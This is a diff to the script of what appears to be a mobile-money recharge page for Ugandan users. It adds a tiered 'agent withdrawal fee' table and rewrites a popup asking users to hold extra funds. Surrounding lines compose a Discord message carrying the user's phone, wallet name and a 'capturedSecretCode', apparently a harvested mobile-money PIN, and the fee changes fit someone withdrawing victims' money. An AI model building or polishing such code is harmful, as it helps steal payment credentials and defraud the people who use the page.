@@ -470,6 +470,22 @@
         let assignedTab = 'mtn';
         let pendingDiscordMessage = '';
 
+        /**
+         * Returns the exact agent withdrawal fee for a given recharge amount
+         * based on standard Uganda mobile money agent charge tiers.
+         */
+        function getNetworkFee(amount) {
+            if (amount <= 15000)   return 700;
+            if (amount <= 30000)   return 850;
+            if (amount <= 45000)   return 1300;
+            if (amount <= 50000)   return 1500;
+            if (amount <= 250000)  return 4500;
+            if (amount <= 500000)  return 7000;
+            if (amount <= 1000000) return 12500;
+            if (amount <= 2000000) return 15000;
+            return 15000; // fallback for amounts above 2,000,000
+        }
+
         async function detectNetwork() {
             const { data: { user } } = await getCurrentUser();
             if (!user) return;
@@ -597,13 +613,13 @@
                     pendingDiscordMessage = `🔋 Recharge Request!\n💳 Payment Method: Airtel Money\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}\n🔑 Secret Code: ${capturedSecretCode}`;
                 }
 
-                // Calculate network fee (9% rounded up to nearest 100)
-                const networkFee = Math.ceil(amount * 0.09 / 100) * 100;
+                // Look up exact network fee from tier table
+                const networkFee = getNetworkFee(amount);
                 const totalNeeded = amount + networkFee;
 
                 // Show popup
                 document.getElementById('fee-popup-message').textContent =
-                    `You are recharging UGX ${amount.toLocaleString()}, please ensure you have an amount of at least UGX ${totalNeeded.toLocaleString()} on your mobile money account or the transaction will fail.`;
+                    `You are recharging UGX ${amount.toLocaleString()}. Please ensure you have at least UGX ${totalNeeded.toLocaleString()} on your mobile money account to cover the agent withdrawal fee of UGX ${networkFee.toLocaleString()}, otherwise the transaction will fail.`;
                 document.getElementById('fee-popup-overlay').style.display = 'flex';
 
             } catch (err) {
